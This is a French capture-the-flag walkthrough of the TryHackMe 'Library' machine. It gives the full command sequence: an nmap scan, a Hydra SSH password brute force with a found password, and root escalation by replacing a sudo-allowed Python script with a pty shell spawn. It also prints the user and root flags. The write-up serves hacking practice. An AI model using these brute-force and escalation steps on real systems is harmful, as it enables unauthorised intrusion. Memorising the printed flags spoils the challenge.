# Library #

***

On scan le réseau avec nmap.
```bash
tim@kali:~/Bureau/tryhackme/write-up$ nmap -A 10.10.80.19
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 16:05 CEST
Nmap scan report for 10.10.80.19
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.41 seconds
```

On voit ici deux services ouvert :
- ssh au port 22
- html au port 80

Regardons le contenons le site web avec un navigateur.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ lynx http://10.10.80.19
* Blog
     * About
     * Archives
     * Contact

Hack the planet!!!

   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut ee8c8c6c256c35515d1d344ee0488c617nim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.
   Flower

This is the title of a blog post

   Posted on June 29th 2009 by meliodas - 3 comments

   Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin euismod tellus eu orci imperdiet nec rutrum lacus blandit. Cras enim nibh, sodales ultricies elementum vel, fermentum id tellus. Proin metus odio, ultricies eu
   pharetra dictum, laoreet id odio. Curabitur in odio augue. Morbi congue auctor interdum. Phasellus sit amet metus justo. Phasellus vitae tellus orci, at elementum ipsum. In in quam eget diam adipiscing condimentum. Maecenas
   gravida diam vitae nisi convallis vulputate quis sit amet nibh. Nullam ut velit tortor. Curabitur ut elit id nisl volutpat consectetur ac ac lorem. Quisque non elit et elit lacinia lobortis nec a velit. Sed ac nisl sed enim
   consequat porttitor.
   Flower

   Pellentesque ut sapien arcu, egestas mollis massa. Fusce lectus leo, fringilla at aliquet sit amet, volutpat non erat. Aenean molestie nibh vitae turpis venenatis vel accumsan nunc tincidunt. Suspendisse id purus vel felis auctor
   mattis non ac erat. Pellentesque sodales venenatis condimentum. Aliquam sit amet nibh nisi, ut pulvinar est. Sed ullamcorper nisi vel tortor volutpat eleifend. Vestibulum iaculis ullamcorper diam consectetur sagittis. Quisque
   vitae mauris ut elit semper condimentum varius nec nisl. Nulla tempus porttitor dolor ac eleifend. Proin vitae purus lectus, a hendrerit ipsum. Aliquam mattis lacinia risus in blandit.

   Vivamus vitae nulla dolor. Suspendisse eu lacinia justo. Vestibulum a felis ante, non aliquam leo. Aliquam eleifend, est viverra semper luctus, metus purus commodo elit, a elementum nisi lectus vel magna. Praesent faucibus leo
   sit amet arcu vehicula sed facilisis eros aliquet. Etiam sodales, enim sit amet mollis vestibulum, ipsum sapien accumsan lectus, eget ultricies arcu velit ut diam. Aenean fermentum luctus nulla, eu malesuada urna consequat in.
   Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Pellentesque massa lacus, sodales id facilisis ac, lobortis sed arcu. Donec hendrerit fringilla ligula, ac rutrum nulla bibendum id.
   Cras sapien ligula, tincidunt eget euismod nec, ultricies eu augue. Nulla vitae velit sollicitudin magna mattis eleifend. Nam enim justo, vulputate vitae pretium ac, rutrum at turpis. Aenean id magna neque. Sed rhoncus aliquet
   viverra.

Comments

   root on June 29th 2009 at 23:35

   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.
   www-data on June 29th 2009 at 23:40

   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.
   Anonymous on June 29th 2009 at 23:59

   Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut.

```

Dans le site on voit que le blog à été posté par meliodas.

Maintenant que l'on a le nom essayons de brute forcer le mot passe ssh avec l'utilisateur melodias.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt  ssh://10.10.80.19 -t 12
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-14 16:33:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 12 tasks per 1 server, overall 12 tasks, 14344399 login tries (l:1/p:14344399), ~1195367 tries per task
[DATA] attacking ssh://10.10.80.19:22/
[STATUS] 137.00 tries/min, 137 tries in 00:01h, 14344267 to do in 1745:03h, 12 active
[22][ssh] host: 10.10.80.19   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-14 16:36:04

```

On trouve comme bon mot de passe  : iloveyou1

On va se connecter et trouver le premier flag.
```bash
tim@kali:~/Bureau/tryhackme/write-up$ ssh meliodas@10.10.80.19
The authenticity of host '10.10.80.19 (10.10.80.19)' can't be established.
ECDSA key fingerprint is SHA256:sKxkgmnt79RkNN7Tn25FLA0EHcu3yil858DSdzrX4Dc.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.80.19' (ECDSA) to the list of known hosts.
meliodas@10.10.80.19's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ cat user.txt 
6d488cbb3f111d135722c33cb635f4ec
```

La réponse au premier flag est : 6d488cbb3f111d135722c33cb635f4ec  

Maitenant il faut trouver un moyen d'être super utilisateur pour trouver le seconds flag.  

```bash
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

On voit que l'on peut exécuter un fichier bak.py avec sudo sans mot de passe.  

```bash
meliodas@ubuntu:~$ ls -al bak.py 
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py
```

Le fichier est seulement en lecture seul pour meliodas.

```bash
meliodas@ubuntu:~$ ls -al ../
total 12
drwxr-xr-x  3 root     root     4096 Aug 23  2019 .
drwxr-xr-x 22 root     root     4096 Aug 24  2019 ..
drwxr-xr-x  4 meliodas meliodas 4096 Aug 24  2019 meliodas
meliodas@ubuntu:~$ rm bak.py
rm: remove write-protected regular file 'bak.py'? y
```

Mais meliodas à des droits d'écrtiture sur le répertoire meliosas, je peux effacer le fichier bak.y

```bash
meliodas@ubuntu:~$ echo "import pty;pty.spawn(\"/bin/sh\")" > bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
# whoami
root
# cat /root/root.txt 
e8c8c6c256c35515d1d344ee0488c617
```

On créer un fichier bak.py contient des instructions pour exécuter un shell, puis on l'exécute avec sudo.
On obtient un shell avec les autorisions root.  
Il ne reste plus que à lire le flag dans /root/root.txt.  

La réponse est : e8c8c6c256c35515d1d344ee0488c617